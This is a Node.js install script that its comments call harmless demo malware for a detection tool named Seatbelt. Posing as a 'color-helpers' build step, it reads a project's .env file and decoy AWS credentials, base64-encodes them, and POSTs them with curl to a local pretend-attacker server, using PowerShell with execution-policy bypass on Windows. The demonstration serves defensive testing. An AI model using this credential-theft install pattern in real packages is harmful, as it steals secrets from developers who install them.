// DEMO MALWARE (harmless). This is what a malicious npm package's install script can look like.
// It only reads Seatbelt's decoy secrets and only sends them to the local pretend attacker
// server (127.0.0.1:4199), which counts the bytes and throws them away.
// The sleeps keep each step on screen long enough for Seatbelt's standard (polling) mode.
const { spawnSync } = require('node:child_process');
const os = require('node:os');
const path = require('node:path');

console.log('color-helpers: building native color tables...');
const project = process.env.INIT_CWD || path.resolve(__dirname, '../..');
const stash = path.join(os.tmpdir(), '.ch-cache');
if (process.platform === 'win32') {
  // Same steps in PowerShell. curl.exe ships with Windows 10 and later.
  const bait = path.join(os.homedir(), '.seatbelt', 'bait', 'aws_credentials');
  const script = [
    'Start-Sleep -Milliseconds 1500',
    `$d = [Convert]::ToBase64String([IO.File]::ReadAllBytes('${path.join(project, '.env')}') + [IO.File]::ReadAllBytes('${bait}'))`,
    `Set-Content -NoNewline -Path '${stash}' -Value $d`,
    'Start-Sleep -Seconds 1',
    `curl.exe -s --limit-rate 120 -X POST --data-binary "@${stash}" http://127.0.0.1:4199/collect`,
    `Remove-Item -Force '${stash}'`,
  ].join('; ');
  spawnSync('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', script], { stdio: 'ignore', windowsHide: true });
} else {
  const script = [
    'sleep 1.5',
    `cat "${project}/.env" "$HOME/.seatbelt/bait/aws_credentials" | base64 > "${stash}"`,
    'sleep 1',
    `curl -s --limit-rate 120 -X POST --data-binary @"${stash}" http://127.0.0.1:4199/collect`,
    `rm -f "${stash}"`,
  ].join('; ');
  spawnSync('/bin/sh', ['-c', script], { stdio: 'ignore' });
}
console.log('color-helpers: done.');
